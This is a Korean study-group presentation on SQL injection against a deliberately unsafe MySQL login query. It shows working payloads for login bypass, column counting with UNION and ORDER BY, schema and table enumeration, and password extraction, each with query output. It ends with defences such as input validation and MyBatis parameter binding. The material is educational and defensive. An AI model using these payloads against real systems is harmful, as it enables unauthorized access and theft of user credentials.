# 2023-08-22 (화) 발표 : SQL Injection

# 1️⃣ SQL Injection

- 악의적인 SQL Query 문을 날려 DB를 비정상적으로 조작하는 해킹 방법

# 2️⃣ 공격 방법

## ✳️ WHERE 절 구문을 이용한 **인증 우회 방법**

### 상황

- SQL Injetion 에 안전하지 않은 쿼리문

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '${username}' AND password = '${password}'
```

### SQL Injection

```
입력: 1' or true LIMIT 1#
```

```sql
SELECT username, description, is_admin
FROM member
WHERE **username = '1' OR true LIMIT 1**#AND password = '${password}'

-- 결과
+----------+--------------------------+----------+
| username | description              | is_admin |
+----------+--------------------------+----------+
| admin    | Where did you find this? |        1 |
+----------+--------------------------+----------+
1 row in set (0.01 sec)
```

- WHERE 절 조건이 무조건 `true` 가 되면서 member 정보가 노출된다

## ✳️ UNION을 활용한 컬럼 개수 찾기

### UNION

- 여러 개의 SELECT 문 결과를 하나의 테이블(결과 집합)으로 합쳐주는 구문
    - SELECT 문으로 선택된 필드의 개수와 타입은 모두 같아야 하며, 필드의 순서 또한 같아야 한다.
    
    ```sql
    SELECT 필드_1, 필드_2
    FROM 테이블_1
    UNION
    SELECT 필드_1, 필드_2
    FROM 테이블_2
    ```
    

### 상황

- SQL Injetion 에 안전하지 않은 쿼리문

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '${username}' AND password = '${password}'
```

### SQL Injection

```
입력: 1' UNION SELECT 1#
```

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '1' UNION SELECT 1# AND password = '${password}'

-- 실패
ERROR 1064 (42000): You have an error in your SQL syntax;
```

- 컬럼 수가 맞지 않아서 실패

```
입력: 1' UNION SELECT 1,1,1#
```

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '1' UNION SELECT 1, 1, 1# AND password = '${password}'

-- 결과
+----------+-------------+----------+
| username | description | is_admin |
+----------+-------------+----------+
| 1        | 1           |        1 |
+----------+-------------+----------+
1 row in set (0.00 sec)
```

- 로그인기능을 수행하는 SQL의 컬럼 수가 3개인 것을 확인할 수 있다.

## ✳️ ORDER BY 절을 활용한 컬럼 개수 찾기

### 상황

- SQL Injetion 에 안전하지 않은 쿼리문

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '${username}' AND password = '${password}'
```

### SQL Injection

```
입력: 1' ORDER BY 1#
```

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '1' ORDER BY 1# AND password = '${password}'

-- 결과 : 에러가 아니라 결과가 없는 것
Empty set (0.00 sec)
```

```
입력: 1' ORDER BY 4#
```

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '1' ORDER BY 4# AND password = '${password}'

-- 결과
ERROR 1054 (42S22): Unknown column '4' in 'order clause'
```

- 4 번째 컬럼은 없기 때문에 에러
    - 컬럼이 몇 개인지 유추 가능

## ✳️ ****데이터베이스 이름 찾기

```sql
SELECT schema_name, 1, 1 FROM information_schema.schemata;

+--------------------+---+---+
| SCHEMA_NAME        | 1 | 1 |
+--------------------+---+---+
| mysql              | 1 | 1 |
| information_schema | 1 | 1 |
| performance_schema | 1 | 1 |
| sys                | 1 | 1 |
| issue_tracker      | 1 | 1 |
| issue_tracker_test | 1 | 1 |
| sqlinjection       | 1 | 1 |
| stock_example      | 1 | 1 |
+--------------------+---+---+
```

```
입력: 1' UNION SELECT schema_name, 1, 1 FROM information_schema.schemata LIMIT 6,1#
```

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '1' 
UNION 
SELECT schema_name, 1, 1 
FROM information_schema.schemata 
LIMIT 6,1#' AND password = ''

+--------------+-------------+----------+
| username     | description | is_admin |
+--------------+-------------+----------+
| sqlinjection | 1           |        1 |
+--------------+-------------+----------+
1 row in set (0.01 sec)
```

## ✳️ 테이블 이름 찾기

```sql
SELECT table_schema, table_name, 1 FROM information_schema.tables WHERE table_schema = 'sqlinjection';
+--------------+------------+---+
| TABLE_SCHEMA | TABLE_NAME | 1 |
+--------------+------------+---+
| sqlinjection | member     | 1 |
| sqlinjection | post       | 1 |
+--------------+------------+---+
2 rows in set (0.01 sec)
```

```
입력: 1' UNION SELECT table_schema, table_name, 1 FROM information_schema.tables WHERE table_schema = 'sqlinjection' LIMIT 1#
```

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '1' 
UNION 
SELECT table_schema, table_name, 1 
FROM information_schema.tables 
WHERE table_schema = 'sqlinjection' 
LIMIT 1#' AND password = ''

+--------------+-------------+----------+
| username     | description | is_admin |
+--------------+-------------+----------+
| sqlinjection | member      |        1 |
+--------------+-------------+----------+
1 row in set (0.00 sec)
```

## ✳️ 컬럼 이름 찾기

```sql
SELECT table_name, column_name, 1 
FROM information_schema.columns 
WHERE table_schema = "sqlinjection" 
AND table_name = "member"

+------------+-------------+---+
| TABLE_NAME | COLUMN_NAME | 1 |
+------------+-------------+---+
| member     | id          | 1 |
| member     | username    | 1 |
| member     | password    | 1 |
| member     | description | 1 |
| member     | is_admin    | 1 |
+------------+-------------+---+
5 rows in set (0.01 sec)
```

```sql
입력: 1' UNION SELECT table_name, column_name, 1 FROM information_schema.columns WHERE table_schema = "sqlinjection" AND table_name = "member" LIMIT 1,1#
```

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '1' 
UNION 
SELECT table_name, column_name, 1 
FROM information_schema.columns 
WHERE table_schema = "sqlinjection" 
AND table_name = "member" 
LIMIT 1,1#' AND password = ''
 
|---------|------------|---------|
|username |description |is_admin |
|---------|------------|---------|
|member   |username    |true     |
|---------|------------|---------|
```

## ✳️ 비밀번호 탈취

```sql
SELECT username, password, 1 FROM member;

+----------+----------+---+
| username | password | 1 |
+----------+----------+---+
| admin    | 1234     | 1 |
| user01   | 1234     | 1 |
| user02   | 1234     | 1 |
+----------+----------+---+
3 rows in set (0.00 sec)
```

```sql
입력: 1' UNION SELECT username, password, 1 FROM member LIMIT 1#
```

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '1' 
UNION 
SELECT username, password, 1 
FROM member 
LIMIT 1#' AND password = ''

|---------|------------|---------|
|username |description |is_admin |
|---------|------------|---------|
|admin    |1234        |true     |
|---------|------------|---------|
```

# 3️⃣ 예방법

## ✳️ 입력값 검증하기

- Validation 등으로 입력값 타입, 길이를 제한하기

## ✳️ 너무 상세한 에러 메시지를 반환하지 않기
<img width="599" alt="whitelabel" src="https://github.com/CodeSquad-2023-BE-Study/DB-Study/assets/86359180/5074040d-40d2-4aae-8089-28593b6a3450">

![1538564323611](https://github.com/CodeSquad-2023-BE-Study/DB-Study/assets/86359180/a48f6766-1a7d-4f37-a2e0-d38bf837d0e5)

- Spring boot의 Whitelabel 페이지는 에러 코드만 반환
- 예전 spring 버전이나, jsp 프로젝트는 예외 페이지에 에러 코드까지 반환함…

## ✳️ 도구 잘 활용하기

- 웬만한 DB 접근 라이브러리들은 다 sql injection에 대비하고 있다.

### MyBatis 예시 - `&{}` 대신 `#{}` 사용하기

- `#{}`은 바인딩 된 값에 ‘’을 자동으로 씌어준다.

```sql
SELECT username, description, is_admin
FROM member
WHERE username = #{username} AND password = #{password}
```

```
입력: 1' or true LIMIT 1#
```

```sql
SELECT username, description, is_admin
FROM member
WHERE username = '1'' or true LIMIT 1#' AND password = ''
```
